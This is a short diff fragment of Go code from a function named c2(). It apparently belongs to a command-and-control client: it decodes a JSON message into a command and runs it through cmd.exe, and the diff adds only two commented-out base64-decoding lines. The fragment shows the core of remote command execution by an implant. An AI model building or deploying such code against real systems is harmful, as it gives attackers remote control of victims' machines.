@@ -129,6 +129,8 @@ func c2() {
 	//cmd := string(msgn)
 	//fmt.Printf(cmd)
 	var c Cmd
+	//decodedMsgn, err := base64.StdEncoding.DecodeString(msgn)
+	//err = json.Unmarshal(decodedMsgn, &c)
 	err = json.Unmarshal(msgn, &c)
 	fmt.Println(c.Command)
 	t := exec.Command("cmd.exe", "/c", c.Command) //c.Command
